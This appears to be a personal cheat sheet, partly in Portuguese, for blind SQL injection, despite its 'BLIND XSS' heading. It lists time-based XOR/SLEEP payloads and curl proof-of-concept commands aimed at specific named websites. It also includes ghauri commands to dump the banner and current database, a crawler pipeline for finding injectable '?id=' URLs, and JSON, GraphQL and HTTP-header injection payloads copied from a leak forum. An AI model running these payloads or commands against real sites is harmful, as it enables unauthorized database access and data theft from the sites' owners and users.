BLIND XSS
https://www.youtube.com/watch?v=KhVMSTYgMxc&t=264s
https://www.youtube.com/watch?v=x1z4GxDtEo0 (sqlmapapi)
https://www.youtube.com/watch?v=Eu1_LbUzdR0

Exemplos:
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md

Comando utilizados nos parametros
[DATA]'--
[DATA]"--
[DATA]\
[DATA]#

Comando terminal (POC):

   ```bash
   [POST]
   time curl -X POST -d "[DATA]" https://omnibookslibrary.com/login.php
   time curl -X POST -d "mobile='XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&password=test&login=" https://omnibookslibrary.com/login.php

   ghauri -u 'https://omnibookslibrary.com/login.php' --data "mobile=*&password=test&login=" --batch --flush-session

   Criar um arquivo poc.txt com a requisição, o conteúdo é o mesmo utilizado no BURP.
   ghauri -r poc.txt --batch --level 3

   [GET]
   time curl -I "https://omnibookslibrary.com/fccr/busca/'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"

   ghauri -u ""https://omnibookslibrary.com/fccr/busca/*" --batch --tech=T --dbms mysql --banner --current-db --flush-session

Extrair URLS com parâmetro (=) de sites para serem utilizadas em chamadas GET (crawler)

   echo https://cutm.ac.in | gau | urldedupe -qs | gf sqli | grep ?id=

   python lostsec.py "https://cutm.ac.in/payu/skill/index.php?id=17" -p payloads/xor.txt -t 5 -o sqli.txt

User-Agent
font:https://hackerone.com/reports/2599826
Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG

==========================================================================================================================================
FONTE: https://leakbase.la/threads/blind-sql-injection-detection-and-exploitation-cheat-sheet.7223/

4.Blind Sql injection in json:

{payload}

[payload]

{value payload}

Example:

[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]{AnD SLEEP(5)}{1 AnD SLEEP(5)}{1' AnD SLEEP(5)--}{sleep 5}"emails":["AnD SLEEP(5)"]"emails":["test@gmail.com' OR SLEEP(5)#"]{"options":{"id":[],"emails":["AnD SLEEP(5)"],

5.Blind Sql injection in Graphql:

{“operationName”:”pages”,”variables”:{“offset”:0,”limit”:10,”sortc”:”name Payload”,”sortrev”:false},”query”:”query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n __typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n”}

Example:

{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name AND sleep(5)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n __typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n"}

6.Http header based (Error based,Time Based):

Referer: https://https://redact.com/408685756payload

Cookie: _gcl_au=1.1.2127391584.1587087463payload

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87Payload

or

Referer: https://https://redact.com/408685756 payload

Cookie: _gcl_au=1.1.2127391584.1587087463 payload

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Payload

X-Forwarded-For: payload
